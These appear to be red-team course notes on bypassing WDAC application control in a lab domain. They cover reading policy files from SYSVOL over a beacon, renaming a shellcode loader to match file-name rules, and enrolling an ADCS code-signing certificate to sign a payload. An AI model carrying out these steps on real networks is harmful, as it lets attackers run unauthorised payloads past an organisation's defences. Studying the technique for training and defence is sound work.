
WDAC is a Windows technology designed to control which applications and drivers are allowed to run on a machine.  It sounds a lot like AppLocker, but with a few key differences.  The most significant of which is that Microsoft recognises WDAC as an [official security boundary](https://www.microsoft.com/en-us/msrc/windows-security-servicing-criteria), which means that it's substantially more robust and applicable bypasses are actually fixed (and a CVE often issued to the finder).

The term "WDAC bypass" is used herein, but this is disingenuous since we're never actually bypassing WDAC at a fundamental level.  Instead, we must find weaknesses in the policy deployed by an organization.

WDAC policies can generally be read from the machine they are applied to. This can be found on the domain controller, within the `Policies` folder on it's SMB service.

```
 beacon> ls \\acme.corp\SYSVOL\acme.corp\Policies\{9C02E6CB-854E-4DEF-86AB-3647AE89309F}\Machine\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 549b     fil     04/05/2023 10:41:45   comment.cmtx
 432b     fil     04/05/2023 10:41:45   Registry.pol

beacon> download \\acme.corp\SYSVOL\acme.corp\Policies\{9C02E6CB-854E-4DEF-86AB-3647AE89309F}\Machine\Registry.pol
[*] download of Registry.pol is complete
```

We can extract this file and parse the policy file to determine what WDAC rules are in place.

```

PS C:\Users\Attacker\Desktop> Parse-PolFile .\Registry.pol

KeyName     : SOFTWARE\Policies\Microsoft\Windows\DeviceGuard
ValueName   : DeployConfigCIPolicy
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 1

KeyName     : SOFTWARE\Policies\Microsoft\Windows\DeviceGuard
ValueName   : ConfigCIPolicyFilePath
ValueType   : REG_SZ
ValueLength : 100
ValueData   : \\acme.corp\SYSVOL\acme.corp\scripts\CIPolicy.p7b
```

These policies files are generally in a world-readable location, meaning we can simply extract it from the SMB service with any beacon we control on the domain.

```
beacon> download \\acme.corp\SYSVOL\acme.corp\scripts\CIPolicy.p7b
[*] download of CIPolicy.p7b is complete
```

We'll then utilize the `CIPolicyParser` to convert it to a readable file.

```
PS C:\Users\Attacker\Desktop> ipmo C:\Tools\CIPolicyParser.ps1
PS C:\Users\Attacker\Desktop> ConvertTo-CIPolicy -BinaryFilePath .\CIPolicy.p7b -XmlFilePath CIPolicy.xml

    Directory: C:\Users\Attacker\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        04/05/2023     15:37          15046 CIPolicy.xml
```

WDAC allows for very granular control when it comes to trusting an application.  The most commonly used rules include:

- Hash - allows binaries to run based on their hash values.
- FileName - allows binaries to run based on their original filename.
- FilePath - allows binaries to run from specific file path locations.
- Publisher - allows binaries to run that are signed by a particular CA.

# File Name Bypass

As we can see, an example rule may be set up to allow files under a specific name prefix and application version value to run as executables on a machine with WDAC enabled.

![](https://files.cdn.thinkific.com/file_uploads/584845/images/142/fed/a3c/file-rule-2.png)

The only exception to this is ensuring that our executables fall under the executable name, along with the file version. These are both values that can be modified in Visual Studio.

![](https://files.cdn.thinkific.com/file_uploads/584845/images/959/058/ff2/build.png)

![](https://files.cdn.thinkific.com/file_uploads/584845/images/f14/078/012/file-version.png)

Once compiled, our shellcode loader will inherit the application name and version values, despite them being needless for the loader to actually run.

# Trusted Signing Bypass

In some cases, we may be able to bypass WDAC by utilizing a completely benign method. Generally, there may be times where an ADCS endpoint employs binary signing, so that binaries that are signed can bypass WDAC automatically. We can use this to our advantage, and sign a binary with said trusted installer so that in bypasses WDAC without any other coverage.

We can see the `TBS` entry on the certificate is located below, which is short for "ToBeSigned". This means that we'll need to obtain the actual certificate that trusted binaries are generated with, then request that certificate to be granted to our binary.

To progress with this, we'll need to determine if a certificate signing template exists on the CA, and we'll also need to be within the group for its enrollment rights. We can find this with both Certify or Certipy. Remember that this all needs to be done within a computer that is domain-joined or that we control within the domain.

```
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /ca:sub-ca.acme.corp\sub-ca
```

![](https://files.cdn.thinkific.com/file_uploads/584845/images/4aa/012/b12/certify-find.png)

We'll then create a `.inf` file with the following content.

```
[NewRequest]
Subject = "CN=ACME Corp"

KeySpec = 1
KeyLength = 2048
Exportable = TRUE
MachineKeySet = FALSE
SMIME = False
PrivateKeyArchive = FALSE
UserProtected = FALSE
UseExistingKeySet = FALSE
ProviderName = "Microsoft RSA SChannel Cryptographic Provider"
ProviderType = 12
RequestType = PKCS10
KeyUsage = 0xa0
HashAlgorithm = SHA256

[RequestAttributes]
CertificateTemplate=RTOCodeSigning

[EnhancedKeyUsageExtension]
OID=1.3.6.1.5.5.7.3.3
```

Then we'll convert that binary to CSR format.

```
C:\Temp>certreq -new -config sub-ca.acme.corp\sub-ca acme.inf acme.csr
Active Directory Enrollment Policy
  {8FCFCA3D-C3D3-4C86-9205-AB1140A2DA9C}
  ldap:

CertReq: Request Created
```

Next we'll submit our `csr` file that we requested to the CA.

```
C:\Temp>certreq -submit -config sub-ca.acme.corp\sub-ca acme.csr cert.cer
RequestId: 15
RequestId: "15"
Certificate retrieved(Issued) Issued
```

We don't have a private key yet, so we'll need to install the certificate and then re-export it with the provided private key.

```
C:\Temp>certreq -accept cert.cer
Installed Certificate:
  Serial Number: 6e0000001afeb61facac1df4a700000000001a
  Subject: CN=ACME Corp
  NotBefore: 5/9/2023 4:12 PM
  NotAfter: 5/8/2024 4:12 PM
  Thumbprint: acb7fd757c71a9aac320ffecb7ba95449d73898b
```

We'll then need to find the certificates within the user's local store and get the ID of the certificate that we just imported. In our case, the only certificate that is within our user's store is the one we just generated.

```
C:\Temp>certutil -user -store My
My "Personal"
================ Certificate 0 ================
Serial Number: 6e0000001afeb61facac1df4a700000000001a
Issuer: CN=sub-ca, DC=acme, DC=corp
 NotBefore: 5/9/2023 4:12 PM
 NotAfter: 5/8/2024 4:12 PM
Subject: CN=ACME Corp
Non-root Certificate
Template: RTOCodeSigning, RTO Code Signing
Cert Hash(sha1): acb7fd757c71a9aac320ffecb7ba95449d73898b
  Key Container = d9ad848ef1b20c57fbdb2104a83a253f_9611fe18-21d3-47ec-b1ef-5c639db10ae8
  Simple container name: tq-RTOCodeSigning-4cb60e9d-8c30-4ebc-b06d-5b4b06723f0e
  Provider = Microsoft RSA SChannel Cryptographic Provider
Encryption test passed
CertUtil: -store command completed successfully.
```

We can then export it with the private key and the password.

```
C:\Temp>certutil -user -exportpfx -privatekey -p pass123 My 0 acme.pfx
My "Personal"
================ Certificate 0 ================
Serial Number: 6e0000001afeb61facac1df4a700000000001a
Issuer: CN=sub-ca, DC=acme, DC=corp
 NotBefore: 5/9/2023 4:12 PM
 NotAfter: 5/8/2024 4:12 PM
Subject: CN=ACME Corp
Non-root Certificate
Template: RTOCodeSigning, RTO Code Signing
Cert Hash(sha1): acb7fd757c71a9aac320ffecb7ba95449d73898b
  Key Container = d9ad848ef1b20c57fbdb2104a83a253f_9611fe18-21d3-47ec-b1ef-5c639db10ae8
  Simple container name: tq-RTOCodeSigning-4cb60e9d-8c30-4ebc-b06d-5b4b06723f0e
  Provider = Microsoft RSA SChannel Cryptographic Provider
Encryption test passed
CertUtil: -exportPFX command completed successfully.
```

We'll then need to download the exported PFX to our machine. The `signtool` utility can be used (which automatically comes with Windows SDK), and is best to be run from a VS Developer code prompt.

```
C:\Users\Attacker\Desktop>signtool sign /f acme.pfx /p pass123 /fd SHA256 C:\Payloads\https_x64.exe
Done Adding Additional Store
Successfully signed: C:\Payloads\https_x64.exe
```